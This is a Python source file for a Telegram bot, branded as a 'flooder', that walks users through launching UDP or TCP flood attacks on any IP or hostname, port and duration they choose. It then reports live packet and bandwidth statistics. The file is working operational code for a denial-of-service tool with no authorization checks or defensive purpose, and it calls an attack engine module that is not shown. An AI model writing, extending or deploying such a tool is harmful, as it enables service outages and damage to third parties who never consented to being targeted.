"""ᴍɪꜱꜱ ᴄʜᴜᴛᴋɪ — Bot Handler"""

from __future__ import annotations

import asyncio
import logging
import os
from typing import Dict, Optional

from pyrogram import Client, filters
from pyrogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
)

from attack_engine import AttackEngine, AttackStats
from config import Config
from utils import human_bytes, is_valid_ip, is_valid_port, resolve_hostname

LOGGER = logging.getLogger(__name__)

BRAND  = "ᴍɪꜱꜱ ᴄʜᴜᴛᴋɪ"
BRAND2 = "ᴍ.ᴄ ꜰʟᴏᴏᴅᴇʀ"

BANNER_PATH = "banner.jpg"


# ─── Session ───────────────────────────────────────────────────────────────────

class UserSession:
    __slots__ = (
        "state", "ip", "port", "duration", "method",
        "engine", "attack_task", "last_msg_id", "chat_id",
    )
    def __init__(self) -> None:
        self.state      : str                       = "idle"
        self.ip         : str                       = ""
        self.port       : int                       = 0
        self.duration   : int                       = 60
        self.method     : str                       = "udp"
        self.engine     : Optional[AttackEngine]    = None
        self.attack_task: Optional[asyncio.Task]    = None
        self.last_msg_id: Optional[int]             = None
        self.chat_id    : Optional[int]             = None


SESSIONS: Dict[int, UserSession] = {}

def get_sess(uid: int) -> UserSession:
    if uid not in SESSIONS:
        SESSIONS[uid] = UserSession()
    return SESSIONS[uid]


# ─── Keyboards ─────────────────────────────────────────────────────────────────

def kb_main() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚡ ꜱᴛᴀʀᴛ ᴀᴛᴛᴀᴄᴋ", callback_data="attack_start")],
        [
            InlineKeyboardButton("📊 ꜱᴛᴀᴛᴜꜱ",  callback_data="status"),
            InlineKeyboardButton("🛑 ꜱᴛᴏᴘ",     callback_data="stop_attack"),
        ],
        [InlineKeyboardButton("ℹ️ ʜᴇʟᴘ", callback_data="help")],
    ])

def kb_method() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🔵 ᴜᴅᴘ ꜰʟᴏᴏᴅ", callback_data="method_udp"),
            InlineKeyboardButton("🔴 ᴛᴄᴘ ꜰʟᴏᴏᴅ", callback_data="method_tcp"),
        ],
        [InlineKeyboardButton("◀️ ʙᴀᴄᴋ", callback_data="back_main")],
    ])

def kb_confirm() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ ʟᴀᴜɴᴄʜ", callback_data="confirm_launch"),
            InlineKeyboardButton("❌ ᴄᴀɴᴄᴇʟ",  callback_data="back_main"),
        ],
        [InlineKeyboardButton("◀️ ʙᴀᴄᴋ", callback_data="back_method")],
    ])

def kb_live() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📊 ʀᴇꜰʀᴇꜱʜ", callback_data="status"),
            InlineKeyboardButton("🛑 ꜱᴛᴏᴘ",    callback_data="stop_attack"),
        ],
    ])

def kb_back() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ ʙᴀᴄᴋ", callback_data="back_main")],
    ])


# ─── Screens ───────────────────────────────────────────────────────────────────

def scr_home() -> str:
    return (
        f"╔══════════════════════╗\n"
        f"║  🎧  **{BRAND}**  🎧  ║\n"
        f"╚══════════════════════╝\n\n"
        f"**ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ {BRAND2}**\n\n"
        f"⚡ ʜɪɢʜ-ꜱᴘᴇᴇᴅ ᴜᴅᴘ / ᴛᴄᴘ ꜰʟᴏᴏᴅ\n"
        f"🎯 ʏᴏᴜ ꜱᴜᴘᴘʟʏ ᴛʜᴇ ɪᴘ — ᴡᴇ ᴅᴏ ᴛʜᴇ ʀᴇꜱᴛ\n"
        f"👇 ꜱᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ:"
    )

def scr_method() -> str:
    return (
        f"🎛️ **ꜱᴇʟᴇᴄᴛ ꜰʟᴏᴏᴅ ᴍᴇᴛʜᴏᴅ**\n\n"
        f"🔵 **ᴜᴅᴘ** — ᴍᴀx ᴛʜʀᴏᴜɢʜᴘᴜᴛ, ᴄᴏɴɴᴇᴄᴛɪᴏɴʟᴇꜱꜱ\n"
        f"🔴 **ᴛᴄᴘ** — ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴇxʜᴀᴜꜱᴛɪᴏɴ\n\n"
        f"👇 ᴄʜᴏᴏꜱᴇ:"
    )

def scr_await_ip(method: str) -> str:
    badge = "🔵 ᴜᴅᴘ" if method == "udp" else "🔴 ᴛᴄᴘ"
    return (
        f"🎯 **ᴇɴᴛᴇʀ ᴛᴀʀɢᴇᴛ ɪᴘ** [{badge}]\n\n"
        f"ᴛʏᴘᴇ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ ɪɴ ᴄʜᴀᴛ:\n"
        f"`192.168.1.1` ᴏʀ `example.com`"
    )

def scr_await_port() -> str:
    return (
        f"🔌 **ᴇɴᴛᴇʀ ᴘᴏʀᴛ**\n\n"
        f"ᴛʏᴘᴇ ᴘᴏʀᴛ ɴᴜᴍʙᴇʀ ɪɴ ᴄʜᴀᴛ:\n"
        f"`80` · `443` · `8080` · `1–65535`"
    )

def scr_await_dur(max_dur: int) -> str:
    return (
        f"⏱️ **ᴇɴᴛᴇʀ ᴅᴜʀᴀᴛɪᴏɴ** (ꜱᴇᴄᴏɴᴅꜱ)\n\n"
        f"ᴍᴀx: `{max_dur}s`\n"
        f"ᴇxᴀᴍᴘʟᴇ: `60` · `120` · `300`"
    )

def scr_confirm(ip: str, port: int, dur: int, method: str, threads: int) -> str:
    badge = "🔵 ᴜᴅᴘ" if method == "udp" else "🔴 ᴛᴄᴘ"
    return (
        f"🚀 **ᴄᴏɴꜰɪʀᴍ ᴀᴛᴛᴀᴄᴋ**\n\n"
        f"┌──────────────────────┐\n"
        f"│ 🎯 ɪᴘ      : `{ip}`\n"
        f"│ 🔌 ᴘᴏʀᴛ   : `{port}`\n"
        f"│ ⏱️ ᴅᴜʀ    : `{dur}s`\n"
        f"│ ⚡ ᴍᴇᴛʜᴏᴅ : {badge}\n"
        f"│ 🧵 ᴛʜʀᴇᴀᴅꜱ: `{threads}`\n"
        f"└──────────────────────┘\n\n"
        f"✅ ʟᴀᴜɴᴄʜ ᴛᴏ ꜰɪʀᴇ 🔥"
    )

def scr_live(ip: str, port: int, dur: int, method: str, elapsed: float) -> str:
    pct       = min(1.0, elapsed / dur) if dur > 0 else 0
    filled    = int(pct * 20)
    bar       = "█" * filled + "░" * (20 - filled)
    remaining = max(0, dur - int(elapsed))
    badge     = "🔵 ᴜᴅᴘ" if method == "udp" else "🔴 ᴛᴄᴘ"
    return (
        f"💥 **ᴀᴛᴛᴀᴄᴋ ɪɴ ᴘʀᴏɢʀᴇꜱꜱ**\n\n"
        f"🎯 `{ip}:{port}` {badge}\n\n"
        f"`[{bar}]`\n"
        f"⏱️ `{int(elapsed)}s` ᴇʟᴀᴘꜱᴇᴅ · `{remaining}s` ʀᴇᴍᴀɪɴɪɴɢ\n\n"
        f"📊 ʀᴇꜰʀᴇꜱʜ ꜰᴏʀ ʟɪᴠᴇ ꜱᴛᴀᴛꜱ · 🛑 ꜱᴛᴏᴘ ᴛᴏ ᴀʙᴏʀᴛ"
    )

def scr_stats(stats: AttackStats, ip: str, port: int, method: str) -> str:
    badge  = "🔵 ᴜᴅᴘ" if method == "udp" else "🔴 ᴛᴄᴘ"
    status = "🟢 ʀᴜɴɴɪɴɢ" if stats.running else "🔴 ꜱᴛᴏᴘᴘᴇᴅ"
    return (
        f"📊 **ʟɪᴠᴇ ꜱᴛᴀᴛꜱ** {status}\n\n"
        f"┌─────────────────────────┐\n"
        f"│ 🎯 `{ip}:{port}` {badge}\n"
        f"│ 📦 ᴘᴋᴛꜱ ꜱᴇɴᴛ  : `{stats.sent_packets:,}`\n"
        f"│ ❌ ꜰᴀɪʟᴇᴅ      : `{stats.failed_packets:,}`\n"
        f"│ 📶 ᴅᴀᴛᴀ ꜱᴇɴᴛ  : `{human_bytes(stats.bytes_sent)}`\n"
        f"│ ⚡ ᴘᴘꜱ         : `{stats.pps:,.0f}`\n"
        f"│ 🌊 ᴍʙᴘꜱ       : `{stats.mbps:.2f}`\n"
        f"│ ⏱️ ᴇʟᴀᴘꜱᴇᴅ    : `{stats.elapsed:.1f}s`\n"
        f"└─────────────────────────┘"
    )

def scr_done(stats: AttackStats, ip: str, port: int, method: str) -> str:
    badge = "🔵 ᴜᴅᴘ" if method == "udp" else "🔴 ᴛᴄᴘ"
    return (
        f"✅ **ᴀᴛᴛᴀᴄᴋ ᴄᴏᴍᴘʟᴇᴛᴇ**\n\n"
        f"🎯 `{ip}:{port}` {badge}\n\n"
        f"┌─────────────────────────┐\n"
        f"│ 📦 ᴛᴏᴛᴀʟ ᴘᴋᴛꜱ : `{stats.sent_packets:,}`\n"
        f"│ 📶 ᴛᴏᴛᴀʟ ᴅᴀᴛᴀ : `{human_bytes(stats.bytes_sent)}`\n"
        f"│ ⚡ ᴀᴠɢ ᴘᴘꜱ    : `{stats.pps:,.0f}`\n"
        f"│ 🌊 ᴀᴠɢ ᴍʙᴘꜱ  : `{stats.mbps:.2f}`\n"
        f"│ ⏱️ ᴅᴜʀᴀᴛɪᴏɴ  : `{stats.elapsed:.1f}s`\n"
        f"└─────────────────────────┘\n\n"
        f"🏠 ʀᴇᴀᴅʏ ꜰᴏʀ ɴᴇxᴛ ᴀᴛᴛᴀᴄᴋ?"
    )

def scr_help() -> str:
    return (
        f"ℹ️ **{BRAND} — ʜᴇʟᴘ**\n\n"
        f"1️⃣ ⚡ **ꜱᴛᴀʀᴛ ᴀᴛᴛᴀᴄᴋ**\n"
        f"2️⃣ ᴄʜᴏᴏꜱᴇ **ᴜᴅᴘ** ᴏʀ **ᴛᴄᴘ**\n"
        f"3️⃣ ᴛʏᴘᴇ ᴛᴀʀɢᴇᴛ **ɪᴘ**\n"
        f"4️⃣ ᴛʏᴘᴇ ᴛᴀʀɢᴇᴛ **ᴘᴏʀᴛ**\n"
        f"5️⃣ ᴛʏᴘᴇ **ᴅᴜʀᴀᴛɪᴏɴ** (ꜱᴇᴄᴏɴᴅꜱ)\n"
        f"6️⃣ ✅ **ʟᴀᴜɴᴄʜ** 🔥\n\n"
        f"**ᴄᴏᴍᴍᴀɴᴅꜱ:**\n"
        f"/start · /stop · /stats"
    )

def scr_err(msg: str) -> str:
    return f"❌ **ᴇʀʀᴏʀ**\n\n`{msg}`"

def scr_idle() -> str:
    return f"📊 **ꜱᴛᴀᴛᴜꜱ**\n\n🟡 ɴᴏ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ\nᴜꜱᴇ **⚡ ꜱᴛᴀʀᴛ ᴀᴛᴛᴀᴄᴋ** ᴛᴏ ʙᴇɢɪɴ"


# ─── Helpers ───────────────────────────────────────────────────────────────────

async def _del(client: Client, chat_id: int, msg_id: int) -> None:
    try:
        await client.delete_messages(chat_id, msg_id)
    except Exception:
        pass


async def _send(
    client: Client,
    sess: UserSession,
    text: str,
    kb: InlineKeyboardMarkup,
    photo: bool = False,
) -> None:
    """Delete old bot message, send new one."""
    if sess.last_msg_id and sess.chat_id:
        await _del(client, sess.chat_id, sess.last_msg_id)
        sess.last_msg_id = None

    if photo and os.path.exists(BANNER_PATH):
        try:
            m = await client.send_photo(
                sess.chat_id, photo=BANNER_PATH, caption=text, reply_markup=kb
            )
            sess.last_msg_id = m.id
            return
        except Exception:
            pass

    m = await client.send_message(sess.chat_id, text, reply_markup=kb)
    sess.last_msg_id = m.id


async def _edit(
    cb_msg: Message,
    sess: UserSession,
    text: str,
    kb: InlineKeyboardMarkup,
) -> None:
    try:
        await cb_msg.edit_text(text, reply_markup=kb)
        sess.last_msg_id = cb_msg.id
    except Exception:
        pass


# ─── Register handlers ─────────────────────────────────────────────────────────

def register(bot: Client, cfg: Config) -> None:

    @bot.on_message(filters.command("start") & filters.private)
    async def cmd_start(client: Client, message: Message) -> None:
        sess = get_sess(message.from_user.id)
        sess.state    = "idle"
        sess.chat_id  = message.chat.id
        await _del(client, message.chat.id, message.id)
        await _send(client, sess, scr_home(), kb_main(), photo=True)

    @bot.on_message(filters.command("stop") & filters.private)
    async def cmd_stop(client: Client, message: Message) -> None:
        sess = get_sess(message.from_user.id)
        sess.chat_id = message.chat.id
        await _del(client, message.chat.id, message.id)
        await _abort(client, sess)

    @bot.on_message(filters.command("stats") & filters.private)
    async def cmd_stats(client: Client, message: Message) -> None:
        sess = get_sess(message.from_user.id)
        sess.chat_id = message.chat.id
        await _del(client, message.chat.id, message.id)
        if sess.engine and sess.engine.stats.running:
            await _send(client, sess,
                        scr_stats(sess.engine.stats, sess.ip, sess.port, sess.method),
                        kb_live())
        else:
            await _send(client, sess, scr_idle(), kb_main())

    # ── text input ─────────────────────────────────────────────────────────────
    @bot.on_message(
        filters.text & filters.private
        & ~filters.command(["start", "stop", "stats"])
    )
    async def on_text(client: Client, message: Message) -> None:
        sess  = get_sess(message.from_user.id)
        sess.chat_id = message.chat.id
        raw   = message.text.strip()
        await _del(client, message.chat.id, message.id)

        if sess.state == "await_ip":
            ip = raw if is_valid_ip(raw) else resolve_hostname(raw)
            if not ip:
                await _send(client, sess, scr_err(f"ᴄᴀɴɴᴏᴛ ʀᴇꜱᴏʟᴠᴇ: {raw}"), kb_back())
                return
            sess.ip    = ip
            sess.state = "await_port"
            await _send(client, sess, scr_await_port(), kb_back())

        elif sess.state == "await_port":
            if not raw.isdigit() or not is_valid_port(int(raw)):
                await _send(client, sess, scr_err("ᴘᴏʀᴛ ᴍᴜꜱᴛ ʙᴇ 1–65535"), kb_back())
                return
            sess.port  = int(raw)
            sess.state = "await_dur"
            await _send(client, sess, scr_await_dur(cfg.max_duration), kb_back())

        elif sess.state == "await_dur":
            if not raw.isdigit():
                await _send(client, sess, scr_err("ᴅᴜʀᴀᴛɪᴏɴ ᴍᴜꜱᴛ ʙᴇ ᴀ ɴᴜᴍʙᴇʀ"), kb_back())
                return
            sess.duration = min(int(raw), cfg.max_duration)
            sess.state    = "confirm"
            await _send(client, sess,
                        scr_confirm(sess.ip, sess.port, sess.duration, sess.method, cfg.max_threads),
                        kb_confirm())
        else:
            await _send(client, sess, scr_home(), kb_main(), photo=True)

    # ── callbacks ──────────────────────────────────────────────────────────────
    @bot.on_callback_query()
    async def on_cb(client: Client, cb: CallbackQuery) -> None:
        sess      = get_sess(cb.from_user.id)
        sess.chat_id = cb.message.chat.id
        data      = cb.data
        await cb.answer()

        if data == "back_main":
            sess.state = "idle"
            await _edit(cb.message, sess, scr_home(), kb_main())

        elif data == "attack_start":
            await _edit(cb.message, sess, scr_method(), kb_method())

        elif data == "method_udp":
            sess.method = "udp"
            sess.state  = "await_ip"
            await _edit(cb.message, sess, scr_await_ip("udp"), kb_back())

        elif data == "method_tcp":
            sess.method = "tcp"
            sess.state  = "await_ip"
            await _edit(cb.message, sess, scr_await_ip("tcp"), kb_back())

        elif data == "back_method":
            sess.state = "idle"
            await _edit(cb.message, sess, scr_method(), kb_method())

        elif data == "confirm_launch":
            if sess.state != "confirm":
                await _edit(cb.message, sess, scr_home(), kb_main())
                return
            sess.state = "attacking"
            await _edit(cb.message, sess,
                        scr_live(sess.ip, sess.port, sess.duration, sess.method, 0),
                        kb_live())
            _launch_attack(client, cb.message, sess, cfg)

        elif data == "status":
            if sess.engine and sess.engine.stats.running:
                s = sess.engine.stats
                await _edit(cb.message, sess,
                            scr_stats(s, sess.ip, sess.port, sess.method),
                            kb_live())
            else:
                await _edit(cb.message, sess, scr_idle(), kb_main())

        elif data == "stop_attack":
            await _abort(client, sess, cb.message)

        elif data == "help":
            await _edit(cb.message, sess, scr_help(), kb_back())


    # ── attack launcher ────────────────────────────────────────────────────────
    def _launch_attack(
        client: Client,
        cb_msg: Message,
        sess: UserSession,
        cfg: Config,
    ) -> None:
        engine = AttackEngine(cfg.max_threads, cfg.max_duration)
        sess.engine = engine

        async def _run() -> None:
            try:
                if sess.method == "udp":
                    stats = await engine.run_udp(sess.ip, sess.port, sess.duration)
                else:
                    stats = await engine.run_tcp(sess.ip, sess.port, sess.duration)
                sess.state = "idle"
                try:
                    await cb_msg.edit_text(
                        scr_done(stats, sess.ip, sess.port, sess.method),
                        reply_markup=kb_main(),
                    )
                except Exception:
                    pass
            except asyncio.CancelledError:
                pass
            except Exception as exc:
                LOGGER.exception("Attack error")
                try:
                    await cb_msg.edit_text(scr_err(str(exc)), reply_markup=kb_main())
                except Exception:
                    pass

        sess.attack_task = asyncio.create_task(_run())


    # ── abort helper ───────────────────────────────────────────────────────────
    async def _abort(
        client: Client,
        sess: UserSession,
        cb_msg: Optional[Message] = None,
    ) -> None:
        was_running = False
        if sess.engine:
            sess.engine.stop()
            was_running = True
        if sess.attack_task and not sess.attack_task.done():
            sess.attack_task.cancel()
            try:
                await sess.attack_task
            except asyncio.CancelledError:
                pass
        sess.state = "idle"

        label = "ꜱᴛᴏᴘᴘᴇᴅ ✅" if was_running else "ɴᴏ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ 🟡"
        text  = f"🛑 **ᴀᴛᴛᴀᴄᴋ {label}**"

        if cb_msg:
            try:
                await cb_msg.edit_text(text, reply_markup=kb_main())
                sess.last_msg_id = cb_msg.id
                return
            except Exception:
                pass
        await _send(client, sess, text, kb_main())
